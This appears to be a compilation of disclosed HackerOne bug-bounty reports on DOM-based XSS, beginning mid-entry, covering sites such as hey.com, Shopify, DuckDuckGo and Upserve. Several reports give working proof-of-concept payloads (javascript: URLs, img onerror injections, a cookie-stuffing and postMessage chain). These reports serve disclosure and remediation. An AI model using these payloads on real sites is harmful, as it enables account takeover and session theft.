- **CVE(s):** -

**Summary (team):**

It was found that the RPC implementation via postMessage within Lark did not check origin, so an attacker could have potentially performed RPC calls on behalf of a user. We thank @mike12 for reporting this to our team and confirming the resolution.

---

### [Possible DOM XSS on app.hey.com](https://hackerone.com/reports/1010132)

- **Report ID:** `1010132`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - DOM
- **Program:** Basecamp
- **Reporter:** @enigmaticjohn
- **Bounty:** - usd
- **Disclosed:** 2020-10-27T19:44:49.290Z
- **CVE(s):** -

**Vulnerability Information:**

#Summary:

Hello Team,
While testing it was observed that on https://app.hey.com/, on Search box there is a possibility of XSS. Although the payload is reflected in the DOM but the CSP blocks the execution of the script, the XSS can happen if the CSP is somehow bypassed. The Subject parameter is vulnerable.

Apart from XSS, the HTML injection attack is working pretty straight forward.

#Steps To Reproduce:
1. Go to https://app.hey.com
2. Login to your account.
3. Click on 'Write' Mail button.
4. Add the recipient as yourself.
5. In the Subject, add following payload
```
TestPayload&lt;/a&gt;&lt;a href="javascript:alert(1)"&gt;ClickHere&lt;/a&gt;
```
6. Send the mail.
7. Go to top left corner Search Box and type "**TestPayload**" 
8. You will see the mail you sent to yourself, and <a> tag will be there "ClickHere".
9. Click on it, you will see the CSP violation in the Console.
10. Below is the CSP of the page:

```
script-src 'self' https://production.haystack-assets.com stats.hey.com *.braintreegateway.com *.braintree-api.com hcaptcha.com *.hcaptcha.com; 
object-src 'none'; 
base-uri 'none'; 
form-action 'self'; 
frame-ancestors 'none'; 
report-uri https://sentry.io/api/1371426/security/?sentry_key=3a5ea420eecc45bd9e1d1c2424683f3a&sentry_environment=production&sentry_release=
```
As seen from the CSP, there might be a possibility of Host whitelists bypass.

## Impact

If attacker send such type of mail to a victim and if victim accidentally searches for the same mail then the Script will be executed leading to account takeover. This is possible only if CSP is bypassed.

---

### [Cross-site Scripting (XSS) - DOM - iqcard.informatica.com](https://hackerone.com/reports/1004833)

- **Report ID:** `1004833`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - DOM
- **Program:** Informatica
- **Reporter:** @rodtvs
- **Bounty:** - usd
- **Disclosed:** 2020-10-13T09:22:13.451Z
- **CVE(s):** -

**Vulnerability Information:**

Hello all

I found a DOM based XSS at iqcard.informatica.com

# Description

After finding the path **iqcard.informatica.com/pub/fujitsu/fm3v2/player/attach.html**. I noticed that the code inside attach.html was vulnerable to DOM XSS, due to the fact of the javascript *document.location function. search*. The code below illustrates the code contained in the attach.html file

```
<HTML>
<HEAD>
<SCRIPT>
function GetAttach()
{
	var strSearch = document.location.search
	strSearch = strSearch.substring(1)
	
	document.location.replace(strSearch)
}
</SCRIPT>
</HEAD>
<BODY onload='GetAttach()'>


</BODY>
</HTML>
```
As can be seen through the code above, the variable * strSearch * receives everything that comes from the URL after the character? and then insert it into the function *document.location.replace ()*. Through this scenario we have some possibilities.

1 - We can direct the user to any page we want for example:

```
https://iqcard.informatica.com/pub/fujitsu/fm3v2/player/attach.html?evil.com
```


2 - We can run a DOM Based XSS, running the javascript schema, javascript: alert (1);

```
https://iqcard.informatica.com/pub/fujitsu/fm3v2/player/attach.html?javascript:alert(1)
```


# PoC 

I uploaded a video and an image.

## Impact

An attacker can redirect a user to a malicious page or execute XSS attacks against users of the application or use that domain as a phishing vector to attack other users of informatica.com

**Summary (team):**

Researcher identified an aged DNS A record pointing to an IP address not owned by Informatica. Analysis showed that the DNS record was not in use for some time and was removed.

---

### [DOM BASED XSS ON https://www.rockstargames.com/GTAOnline/features ](https://hackerone.com/reports/479612)

- **Report ID:** `479612`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - DOM
- **Program:** Rockstar Games
- **Reporter:** @netfuzzer
- **Bounty:** - usd
- **Disclosed:** 2020-06-12T14:47:59.847Z
- **CVE(s):** -

**Summary (team):**

In this report, the researcher identified a DOM-based Cross-Site Scripting vulnerability under the GTAOnline section of the main site. This could have left to theft of cookies if left unresolved. Interestingly, a core factor in this vulnerability was a regression of a previously identified and resolved directory traversal issue. Thanks to this report we were able to close both the regressed directory traversal issue and the cross-site scripting vulnerability at once.

---

### [DOM Based xss on https://www.rockstargames.com/ ( 1 )](https://hackerone.com/reports/475442)

- **Report ID:** `475442`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - DOM
- **Program:** Rockstar Games
- **Reporter:** @netfuzzer
- **Bounty:** - usd
- **Disclosed:** 2020-06-12T14:15:45.082Z
- **CVE(s):** -

**Summary (team):**

In this report the researcher identified a DOM-based Cross-Site Scripting vulnerability on the main rockstargames.com site. This could have been exploited to steal victim's cookies. The XSS vulnerability was discovered by combining multiple lower-severity vulns, such as directory traversal and an open redirect. By identifying all of the component vulnerabilities, the researcher helped us address this vulnerability faster and more completely. The issue is now resolved.

---

### [Warehouse dom based xss may lead to Social Club Account Taker Over.](https://hackerone.com/reports/663312)

- **Report ID:** `663312`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - DOM
- **Program:** Rockstar Games
- **Reporter:** @netfuzzer
- **Bounty:** - usd
- **Disclosed:** 2020-06-11T20:40:18.709Z
- **CVE(s):** -

**Summary (team):**

The researcher brought our attention to a DOM-based Cross-Site Scripting vulnerability. Although issues on rockstarwarehouse.com are typically out of scope, this had an explicit impact on Social Club account security, so we decided we needed to act. The vulnerability only affected Internet Explorer and Edge browser users, but with the researcher's help we were able to work with our partners at Rockstar Warehouse and resolve the vulnerability.

---

### [DOM-based XSS on mobile.line.me](https://hackerone.com/reports/736272)

- **Report ID:** `736272`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - DOM
- **Program:** LY Corporation
- **Reporter:** @zophi
- **Bounty:** - usd
- **Disclosed:** 2020-03-25T06:47:15.332Z
- **CVE(s):** -

**Summary (team):**

The reporter found a DOM-based XSS affecting mobile.line.me, which could have resulted in an attacker gaining access to information about a user's mobile plans, usage and user details registered as part of their mobile subscription plan.

---

### [DOM Based XSS via postMessage at https://inventory.upserve.com/login/](https://hackerone.com/reports/603764)

- **Report ID:** `603764`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - DOM
- **Program:** Upserve 
- **Reporter:** @gamer7112
- **Bounty:** 2500 usd
- **Disclosed:** 2019-06-25T13:56:46.607Z
- **CVE(s):** -

**Vulnerability Information:**

#Description
DOM based XSS is possible at https://inventory.upserve.com/login/ due to insecure origin checking when receiving a postMessage.

#POC
1. Visit https://hq.upserve.com.████████/upserve_xss.html
2. Click link
3. View alert on https://inventory.upserve.com

#Vulnerable Code
```javascript
window.addEventListener("message", function(e) {
  if (~e.origin.indexOf("https://hq.upserve.com")) {
    if (e.data && typeof e.data == "object") {
      try {
        if (e.data["exec"]) {
          eval(e.data["exec"]);
        }
      } catch (err) {
        console.log(err);
      }
    } else {
      console.log("Non-object passed");
    }
  } else {
    console.log("Incorrect origin: " + e.origin.toString());
    return;
  }
});
```
The origin check simply determines if "https://hq.upserve.com" is anywhere in the origin so an origin like "https://hq.upserve.com.mydomain.com" will pass this check just fine.

## Impact

Due to the page being a login page, login credentials could be logged and stolen when a victim goes to login.

**Summary (team):**

Due to incomplete origin validation, DOM-based XSS was possible at https://inventory.upserve.com/login/ when receiving a postMessage.

---

### [H1514 DOMXSS on Embedded SDK via Shopify.API.setWindowLocation abusing cookie Stuffing](https://hackerone.com/reports/422043)

- **Report ID:** `422043`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - DOM
- **Program:** Shopify
- **Reporter:** @filedescriptor
- **Bounty:** - usd
- **Disclosed:** 2019-04-17T14:40:38.473Z
- **CVE(s):** -

**Vulnerability Information:**

Hi Team!

I'm reporting a rather unusual DOMXSS that allows an attacker to perform a XSS attack on any Shopify apps that use the Embedded SDK. To exploit this, several techniques were chained together: Cookie Stuffing -> Login CSRF -> (Not Open) Redirect -> DOMXSS.

#Details
Inspired by #381192, I decided to check all pages to see if there's any broken origin validation. The results were frustrating since they all seemed to be done properly. However I noticed embedded apps did it in a way that it verifies if the coming origin is the logged-in store. Say if I am an admin on foobar.myshopify.com, then an embedded app will check if in-coming messages originate from https://foobar.myshopify.com. I went ahead to look up some [documentations](https://help.shopify.com/en/api/embedded-apps/embedded-app-sdk/initialization), confirming this is by design (`shopOrigin`):

```javascript
ShopifyApp.init({
  shopOrigin: 'https://CURRENT_LOGGED_IN_SHOP.myshopify.com'
[...]
```

Now this is interesting because by design we can execute any JavaScript on our own stores. That means, I can iframe an embedded app on my store, then post any message to it and it will accept it. So I quickly beautify the SDK source code to see if there's any interesting event. Checking common DOMXSS sinks I found that it registers the `Shopify.API.setWindowLocation` event that navigates to a said destination.

https://cdn.shopify.com/s/assets/external/app.js
```javascript
e.setWindowLocation = function(e) {
    return window.location = e
}, e.bindWindowLocation = function() {
    return _Shopify.Messenger.addHandler("Shopify.API.setWindowLocation", function(e) {
        return function(t, n) {
            return e.setWindowLocation(n)
        }
    }(this))
}
```

By navigate to a *javascript:* pseudo URL it can lead to XSS. This can be verified by opening any embedded apps and execute the following code in the DevTools' console
```javascript
$$('iframe')[0].contentWindow.postMessage('{"message":"Shopify.API.setWindowLocation","data":"javascript:alert(document.domain);0[0]"}','*')
```
{F358299}

**However this XSS is almost useless** because the embedded app is authenticated as us, the attacker. When we try to exploit it on a victim it won't work because they are not logged into our store. So you could say this is, a self DOMXSS. Well, almost. 

What if we use Login CSRF to force a victim to be logged into our store? After the victim is logged in to our store, we can then instruct user's browser to log into the embedded app as us by navigating to `/admin/oauth/authorize`. Then the current logged in store will be ours. I came up with an idea to stuff the session cookies using JavaScript.

The session cookies consist of `_secure_admin_session_id` and `_master_udr`. While I could simply write `_secure_admin_session_id` with `docuemnt.cookie` API, I realized a problem with `_master_udr`. Unlike `_secure_admin_session_id`, `_master_udr` is scoped to `.myshopify.com`. If we triy to write our `_master_udr`, then this will happen:

```http
GET https://canvasfoobar.myshopify.com/admin/oauth/authorize?client_id=d25e45407e508f96409c2dd796e9bd95&redirect_uri=https%3A%2F%2Fscript-editor.shopifycloud.com%2Fauth%2Fshopify%2Fcallback&response_type=code&scope=write_scripts%2Cread_products%2Cread_customers&state=a HTTP/1.1
Host: canvasfoobar.myshopify.com
Cookie: _master_udr=LEGIT; _master_udr=EVIL; _secure_admin_session_id=EVIL
```

The legitimate `_master_udr` will override our evil one and the server will refuse to authenticate as us. There is a trick fortunately. 

>“Cookies with longer paths are listed before cookies with shorter paths.” –RFC 6265

By setting a cookie with a very specific (`/admin/oauth` in this case) we can outrun the original one. The code that we will use to force a login will be:

```javascript
document.cookie = '_secure_admin_session_id=EVIL;path=/admin/oauth';
document.cookie = '_master_udr=EVIL;path=/admin/oauth';
```

Another problem is even after all this, the victim will be logged into the embedded app **as us**. That means, all actions only affect our store. 

To solve this we can simply relog in the victim to the embedded app. Since the victim is still logged in their store, we can navigate the victim to https://victim.myshopify.com/admin/oauth/authorize to trigger the auth flow for the embedded app. The drawback is we need to know which store the victim is logged in as. Luckily https://www.shopify.com/path will redirect to the last logged in store of a user, therefore navigating to https://www.shopify.com/admin/oauth/authorize will lead them to https://victim.myshopify.com/admin/oauth/authorize.

Eventually we have our XSS running on the embedded app's domain running with the victim's session.

#Steps to Reproduce

In the PoC, Script Editor will be used as an example.

1. Be logged into your store as an admin and have [Script Editor](https://apps.shopify.com/script-editor) installed
2. Navigate to https://canvasfoobar.myshopify.com/products/canary
3. After the iframe turns grey, click it
4. After a while, a fake modal dialog will show up and a *New Script* will be created

I'm also attaching a video demo.

#Fix

I recommend fixing this issue by validating the URL for `Shopify.API.setWindowLocation`. The other small issues are by design so they are hard to fix.

## Impact

Perform unauthorized actions on a store admin on any embedded apps.

**Summary (team):**

During H1-514, @filedescriptor reported an XSS issue in our Embedded App SDK that allowed for attacking legitimate apps through our platform, due to a missing protocol check on the Shopify.API.setWindowLocation. Since this issue would have allowed realistic attacks against apps using the Embedded App SDK, we decided to award $2500 for this issue. As part of the event, @filedescriptor was also awarded a bonus of $2500 for chaining multiple bugs.

---

### [DOMXSS in redirect param](https://hackerone.com/reports/361287)

- **Report ID:** `361287`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - DOM
- **Program:** Semmle
- **Reporter:** @flamezzz
- **Bounty:** - usd
- **Disclosed:** 2019-03-20T12:34:50.453Z
- **CVE(s):** -

**Vulnerability Information:**

#Summary
The **redirect** param can consist of a ``javascript:`` url, which results in XSS. If a victim visits a malicious URL and logs in, the attacker can perform actions on behalf of the victim.

#Steps to reproduce
1) Logout
2) Visit `` https://lgtm-com.pentesting.semmle.net/?redirect=javascript:prompt(document.domain)%2f%2f
 ``
3) Log in through email

## Impact

If a victim visits a malicious URL and logs in, the attacker can perform actions on behalf of the victim.

---

### [DOM XSS on 50x.html page on proxy.duckduckgo.com](https://hackerone.com/reports/426275)

- **Report ID:** `426275`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - DOM
- **Program:** DuckDuckGo
- **Reporter:** @smither
- **Bounty:** - usd
- **Disclosed:** 2018-11-07T15:44:46.150Z
- **CVE(s):** -

**Vulnerability Information:**

Hi,

I read the report about DOM XSS on 50x.html page (https://hackerone.com/reports/405191).
I decided to check some other subdomains to be sure.
This link still executes javascript:
https://proxy.duckduckgo.com/50x.html?e=&atb=test%22/%3E%3Cimg%20src=x%20onerror=alert(%27test%27);%3E

The following subdomains execute javascript as well:
proxy1.duckduckgo.com
proxy2.duckduckgo.com
proxy3.duckduckgo.com
proxy4.duckduckgo.com

@cujanovic: I'm sorry for stealing.

## Impact

The attacker can execute javascript code.

---

### [DOM XSS on 50x.html page](https://hackerone.com/reports/405191)

- **Report ID:** `405191`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - DOM
- **Program:** DuckDuckGo
- **Reporter:** @cujanovic
- **Bounty:** - usd
- **Disclosed:** 2018-10-16T18:09:59.634Z
- **CVE(s):** -

**Vulnerability Information:**

Hello,

The is a DOM XSS vulnerability on https://duckduckgo.com/50x.html, it seems like the sink is DIV.innerHTML and the source is location.search.
The PoC url is: https://duckduckgo.com/50x.html?e=&atb=test%22/%3E%3Cimg%20src=x%20onerror=alert(document.domain);%3E

The code that is causing this XSS is located in:
https://duckduckgo.com/lib/l110.js
Line 26, Column 60903

Below is the part of the vulnerable code:
`b5.createElement("div"));
cg = (m.exec(b7) || ["", ""])[1].toLowerCase();
b4 = R[cg] || R._default;
ce.innerHTML =  b4[1]  + b7.replace(aB, "<$1></$2>") + b4[2];
cb = b4[0];
while (cb--) {
	ce=ce.lastChild
}
if(!bI.support.leadingWhitespace&&b2.test(b7))`

Screenshot:
{F342240}

## Impact

The attacker can execute JS code.

---

### [CSS Injection on /embed/ via bgcolor parameter leaks user's CSRF token and allows for XSS ](https://hackerone.com/reports/386334)

- **Report ID:** `386334`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - DOM
- **Program:** Chaturbate
- **Reporter:** @nahamsec
- **Bounty:** - usd
- **Disclosed:** 2018-09-19T23:37:20.507Z
- **CVE(s):** -

**Vulnerability Information:**

Hi there,

There's a CSS injection here: https://chaturbate.com/embed/admin/?bgcolor=%7D*%7Bbackground:red&tour=nvfS&disable_sound=0&campaign=iNSGX 

```
  body, div#main, div.content, div.block, div.section {margin: 0px; padding: 0px;}
  body {min-width:800px;}
  div.content {width: 100%;}
  
  body {background: }*{background:red;}

```

This allows an attacker to enumerate the CSRF token. Once the CSRF token is enumerated, we can 

#POC 
1. Go to `http://d0nut.pythonanywhere.com/demo/token_stealing/7GTt5qD1LD273WYkJyaR/reset`
2. Now go to `http://d0nut.pythonanywhere.com/demo/token_stealing/7GTt5qD1LD273WYkJyaR` and let it do it's magic :) 

{F324052}

There are numerous endpoints like `POST /choose_broadcaster_chat_color` where it returns `Content-Type: text/html; charset=utf-8` that could potentially allow a hacker to combine the two for XSS (I haven't gotten that far yet)


 **Do you mind asking your HackerOne contact to allow collaboration on your program, so I can invite another researcher that helped me exploit this fully?**

Thanks,
Ben

## Impact

#

---

### [[html-janitor] Passing user-controlled data to clean() leads to XSS](https://hackerone.com/reports/308155)

- **Report ID:** `308155`
- **Severity:** Critical
- **Weakness:** Cross-site Scripting (XSS) - DOM
- **Program:** Node.js third-party modules
- **Reporter:** @bayotop
- **Bounty:** - usd
- **Disclosed:** 2018-02-09T15:00:45.549Z
- **CVE(s):** CVE-2017-0931

**Vulnerability Information:**

**Module:**

* Name: [html-janitor](https://www.npmjs.com/package/html-janitor)
* Version: 2.0.2

**Summary:**

Passing user-controlled data to the module's clean() function can result in arbitrary JS execution, because of unsafe DOM operations. 

The description "*Cleans up your markup and allows you to take control of your HTML. HTMLJanitor uses a defined whitelist to limit HTML it is given to a defined subset.*" implies that "dirty" HTML is expected and therefore I would assume the clean method should never result in arbitrary JS being executed.

**Description:**

The following will result in JS execution:
```javascript
var myJanitor = new HTMLJanitor({tags:{p:{}}});
var cleanHtml = myJanitor.clean("<p><p>")
```

because [of this code](https://github.com/guardian/html-janitor/blob/master/src/html-janitor.js#L44):

```js
HTMLJanitor.prototype.clean = function (html) {
    var sandbox = document.createElement('div'); // This is not a safe way to create a sandbox.
    sandbox.innerHTML = html; // At this point, the onerror in the img is triggered.
```

**Recommendation:**

The "sandbox" should be created using safe browser APIs such as `document.implementation.createHTMLDocument();`.

*Note that I previously reported this issue at https://github.com/guardian/html-janitor/issues/34*

## Impact

Given the module's description I would assume it should be used to prevent XSS vulnerabilities. This is currently a very dangerous assumption given that the module itself has a XSS vulnerability. 

Note that the author might have never intended to feed untrusted data into the clean() function. However, in that case this should be at least mentioned in the documentation, because other developers most certainly will use the package in such scenarios.

---

### [XSS в названии сервера](https://hackerone.com/reports/262010)

- **Report ID:** `262010`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - DOM
- **Program:** VK.com
- **Reporter:** @pisarenko
- **Bounty:** - usd
- **Disclosed:** 2017-09-20T18:05:09.573Z
- **CVE(s):** -

**Summary (team):**

XSS в поле названия сервера, с ограниченным количеством символов.

**Summary (researcher):**

`Старый админ делает сервер оставляет и продает группу , новый удаляет его но упс срабатывает XSS и старый админ возвращает себе группу . `

но можно вставить `<a href="rg">t` тогда будет ссылка в удалении

Или ВК подгружает страницу ` `

i die

███████████████████████████
███████▀▀▀░░░░░░░▀▀▀███████
████▀░░░░░░░░░░░░░░░░░▀████
███│░░░░░░░░░░░░░░░░░░░│███
██▌│░░░░░░░░░░░░░░░░░░░│▐██
██░└┐░░░░░░░░░░░░░░░░░┌┘░██
██░░└┐░░░░░░░░░░░░░░░┌┘░░██
██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██
██▌░│██████▌░░░▐██████│░▐██
███░│▐███▀▀░░▄░░▀▀███▌│░███
██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██
██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██
████▄─┘██▌░░░░░░░▐██└─▄████
█████░░▐█─┬┬┬┬┬┬┬─█▌░░█████
████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████
█████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████
███████▄░░░░░░░░░░░▄███████
██████████▄▄▄▄▄▄▄██████████
███████████████████████████

---

### [XSS в комментариях от имени сообщества ](https://hackerone.com/reports/264445)

- **Report ID:** `264445`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - DOM
- **Program:** VK.com
- **Reporter:** @flyink
- **Bounty:** - usd
- **Disclosed:** 2017-09-20T17:32:10.470Z
- **CVE(s):** -

**Summary (team):**

XSS в дропдауне выбора сообщества при комментировании.

---

### [[GitHub Extension] Unsanitised HTML leading to XSS on GitHub.com](https://hackerone.com/reports/220494)

- **Report ID:** `220494`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - DOM
- **Program:** Algolia
- **Reporter:** @ysx
- **Bounty:** - usd
- **Disclosed:** 2017-04-24T08:41:06.487Z
- **CVE(s):** -

**Vulnerability Information:**

Hi,

I noticed that certain HTML is unsanitised by the Awesome Autocomplete for GitHub extension, leading to a case of XSS on the GitHub website.

Please note that I **do not have ownership nor affiliation** with the repository and user names in this report, nor the final JavaScript alert dialog. 

# Proof of Concept
I have tested the following Proof of Concept demonstrations with the following conditions:

### Extension
* Latest version of the Awesome Autocomplete extension

### Operating Systems
* macOS Sierra 10.12.4
* Windows 7 x64

### Browsers
* Google Chrome 57.0.2987.133 (latest)
* Safari 10.1 (latest)

## Unsanitised HTML
Please follow the below steps to demonstrate the presence of an unsanitised HTML issue.

1. Search for `'">` element and requests to "x" on GitHub.com

The following images demonstrate that a broken `` element was created in the context of GitHub.com by the Algolia extension:

{F175284}

{F175283}

## XSS on GitHub
Please follow the below steps to demonstrate the presence of a full XSS issue.

1. Search for `a'"><h1` on GitHub.com
2. Because of a specific repository name being loaded, a JavaScript alert dialog will appear:

{F175285}

As noted above, I am currently attempting to reproduce this vulnerability using my own repositories and JavaScript code (e.g. `document.domain` rather than "1337").

Please let me know if you require any additional information regarding these vulnerabilities.

Thanks!

**Summary (researcher):**

In certain cases, HTML elements were unsanitised by the Awesome Autocomplete extension when presented in DOM, leading to XSS on the GitHub website. Thanks to the Algolia team for the swift resolution and fix.

---
